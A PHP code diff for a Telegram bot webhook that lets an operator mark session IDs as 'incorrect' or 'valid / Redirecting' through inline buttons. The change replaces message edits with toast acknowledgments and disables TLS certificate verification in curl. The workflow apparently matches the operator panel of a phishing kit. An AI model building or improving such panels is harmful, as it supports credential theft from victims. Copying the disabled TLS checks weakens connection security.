@@ -7,29 +7,36 @@ $update = json_decode($content, true);
 if (isset($update['callback_query'])) {
     $callback = $update['callback_query'];
     $data = $callback['data']; // e.g., "incorrect_ID" or "valid_ID"
-    $chatId = $callback['message']['chat']['id'];
-    $messageId = $callback['message']['message_id'];
+    $callbackQueryId = $callback['id'];
 
     $parts = explode('_', $data);
-    $action = $parts[0];
-    $sid = $parts[1];
+    $action = $parts[0] ?? '';
+    $sid = $parts[1] ?? '';
 
-    $sessions = file_exists(SESSIONS_FILE) ? json_decode(file_get_contents(SESSIONS_FILE), true) : [];
-    
-    if ($action === 'incorrect') {
-        $sessions[$sid] = 'incorrect';
-        $answerText = "❌ Marked as Incorrect!";
-    } elseif ($action === 'valid') {
-        $sessions[$sid] = 'valid';
-        $answerText = "✅ Marked as Valid / Redirecting...";
+    if ($sid) {
+        $sessions = file_exists(SESSIONS_FILE) ? json_decode(file_get_contents(SESSIONS_FILE), true) : [];
+        
+        if ($action === 'incorrect') {
+            $sessions[$sid] = 'incorrect';
+            $answerText = "❌ Action Recorded: Marked as Incorrect!";
+        } elseif ($action === 'valid') {
+            $sessions[$sid] = 'valid';
+            $answerText = "✅ Action Recorded: Marked as Valid / Redirecting...";
+        }
+
+        file_put_contents(SESSIONS_FILE, json_encode($sessions));
+
+        // ONLY send an acknowledgment popup (toast) to Telegram. 
+        // We completely removed editMessageText so the buttons stay visible and functional!
+        $apiUrl = "https://api.telegram.org/bot" . BOT_TOKEN . "/answerCallbackQuery?callback_query_id=" . urlencode($callbackQueryId) . "&text=" . urlencode($answerText) . "&show_alert=false";
+
+        $ch = curl_init($apiUrl);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
+        curl_exec($ch);
+        curl_close($ch);
     }
-
-    file_put_contents(SESSIONS_FILE, json_encode($sessions));
-
-    // Acknowledge button click
-    @file_get_contents("https://api.telegram.org/bot" . BOT_TOKEN . "/answerCallbackQuery?callback_query_id=" . $callback['id'] . "&text=" . urlencode($answerText));
-    
-    // Update message text in chat
-    @file_get_contents("https://api.telegram.org/bot" . BOT_TOKEN . "/editMessageText?chat_id={$chatId}&message_id={$messageId}&text=" . urlencode($callback['message']['text'] . "\n\n<b>[ADMIN ACTION: " . strtoupper($action) . "]</b>") . "&parse_mode=HTML");
 }
 ?>
